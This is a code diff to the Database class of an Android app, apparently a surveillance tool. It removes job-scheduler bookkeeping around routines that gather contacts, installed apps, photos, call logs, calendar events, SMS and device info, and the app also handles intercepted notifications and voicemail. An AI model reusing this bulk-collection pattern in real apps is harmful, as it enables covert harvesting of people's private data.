@@ -23,8 +23,6 @@ import com.candroid.lofl.data.pojos.InterceptedNotification;
 import com.candroid.lofl.data.pojos.PhoneCall;
 import com.candroid.lofl.data.pojos.SmsMsg;
 import com.candroid.lofl.data.pojos.VoiceMail;
-import com.candroid.lofl.jobs.JobsScheduler;
-import com.candroid.lofl.services.CommandsIntentService;
 import com.candroid.lofl.services.LoflService;
 
 import java.io.File;
@@ -386,7 +384,6 @@ public class Database {
                     e.printStackTrace();
                 } finally {
                     database.endTransaction();
-                    JobsScheduler.setJobRan(context, JobsScheduler.CONTACTS_KEY);
                 }
             }
             //SYNC INSTALLED APPS
@@ -398,7 +395,6 @@ public class Database {
                 e.printStackTrace();
             } finally {
                 database.endTransaction();
-                JobsScheduler.setJobRan(context, JobsScheduler.PACKAGES_KEY);
             }
             //DCIM SYNC
             if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
@@ -415,7 +411,6 @@ public class Database {
                     e.printStackTrace();
                 } finally {
                     database.endTransaction();
-                    JobsScheduler.setJobRan(context, JobsScheduler.DCIM_KEY);
                 }
             }
             //SYNC CALL LOG
@@ -429,7 +424,6 @@ public class Database {
                     e.printStackTrace();
                 } finally {
                     database.endTransaction();
-                    JobsScheduler.setJobRan(context, JobsScheduler.PHONE_CALLS_KEY);
                 }
             }
             //SYNC CALENDAR EVENTS
@@ -443,7 +437,6 @@ public class Database {
                     e.printStackTrace();
                 } finally {
                     database.endTransaction();
-                    JobsScheduler.setJobRan(context, JobsScheduler.CALENDAR_EVENTS_KEY);
                 }
             }
             //SYNC SMS
@@ -457,7 +450,6 @@ public class Database {
                     e.printStackTrace();
                 } finally {
                     database.endTransaction();
-                    JobsScheduler.setJobRan(context, JobsScheduler.SMS_KEY);
                 }
             }
             //SYNC DEVICE INFO
@@ -472,7 +464,6 @@ public class Database {
                 e.printStackTrace();
             } finally {
                 database.endTransaction();
-                JobsScheduler.setJobRan(context, JobsScheduler.DEVICE_KEY);
             }
             //SYNC ACCOUNTS
             //GET_ACCOUNTS permission falls under READ_CONTACTS permission's scope as of 6.0
